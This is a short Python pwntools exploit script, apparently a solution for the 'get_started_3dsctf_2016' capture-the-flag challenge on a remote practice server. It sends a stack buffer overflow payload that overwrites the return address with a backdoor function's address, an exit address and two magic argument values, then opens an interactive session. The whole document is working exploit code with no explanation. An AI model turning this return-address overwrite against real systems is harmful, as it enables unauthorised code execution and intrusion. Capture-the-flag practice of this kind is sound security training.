# method one

from pwn import *


# p = process("./get_started_3dsctf_2016")
p = remote("node4.buuoj.cn", 25577)


back_door = 0x080489A0
exit = 0x0804E6A0
pad = cyclic(0x38)
pad += p32(back_door)+p32(exit)+p32(0x308CD64F)+p32(0x195719D1)
p.sendline(pad)

p.interactive()


